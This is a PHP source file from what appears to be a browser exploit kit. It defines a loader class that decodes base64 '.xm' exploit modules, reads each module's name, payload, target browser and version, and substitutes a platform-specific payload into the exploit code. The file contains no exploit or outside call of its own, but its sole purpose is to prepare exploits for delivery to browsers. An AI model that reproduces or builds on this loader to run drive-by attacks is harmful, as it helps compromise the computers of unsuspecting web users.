<?php
/***************************************************************************
 *   Copyright (C) 2008 by Zer0day					   *
 *   zer0day@mail.ru   						   *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   any later version.                                                    *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program; if not, write to the                         *
 *   Free Software Foundation, Inc.                                        *
 *   File: xmread.php							   *
 ***************************************************************************/

class xmread{

	var $error = "";
	var $name = "Unknown";
	var $payload = "Unknown";
	var $browser = "Unknown";
	var $version = "Unknown";
	var $code = "";

	function xmread($file, $platform=0){

		$mf=fopen($file, "r");
		$i=0;
		// read .xm (exploit module) into array, set code start & end point
		while(!feof($mf)) {
			$line=fgets($mf,1048576);
			$mfarr[$i]=base64_decode($line);
			if($mfarr[$i] == "#code_start#") { $code_start=$i+1;
			} elseif($mfarr[$i] == "#code_end#") { $code_end=$i-1; 
			break;
			}
			$i++;
 		}
		fclose($mf);

		// check if the exploit file is correct

		if($mfarr['0'] != "#xmodule_exploit_module1.0#") {
			return "Invalid File Format";
		} else {
			$xm['name']=$mfarr['1'];
			$xm['payload']=$mfarr['2'];
			$xm['browser']=$mfarr['3'];
			$xm['version']=$mfarr['4'];
			if(!empty($platform)) {
			$payload=GetPayload($platform, $mfarr['2']);
			$xm['code']=stripslashes(str_replace($mfarr['2'], $payload, $mfarr['6']));
			} else {
				$xm['code']=stripslashes($mfarr['6']);
			}

			}
		// assign properties
		$this->error = $xm['error'];
		$this->name = htmlspecialchars($xm['name']);
		$this->payload = htmlspecialchars($xm['payload']);
		$this->browser = htmlspecialchars($xm['browser']);
		$this->version = htmlspecialchars($xm['version']);
		$this->code = $xm['code'];
		}
	}
?>